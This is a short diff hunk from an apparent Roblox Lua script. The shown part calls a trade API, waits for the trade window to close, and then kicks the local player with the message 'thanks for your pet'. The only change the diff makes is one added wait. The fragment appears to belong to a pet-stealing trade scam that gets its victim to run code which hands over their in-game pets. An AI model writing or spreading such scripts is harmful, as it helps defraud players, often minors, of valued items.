@@ -46,5 +46,5 @@ game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/
 repeat
     wait(1)
 until not Player.PlayerGui.TradeApp.Frame.Visible
-
+wait(1)
 game.Players.LocalPlayer:Kick("thanks for your pet, diw")
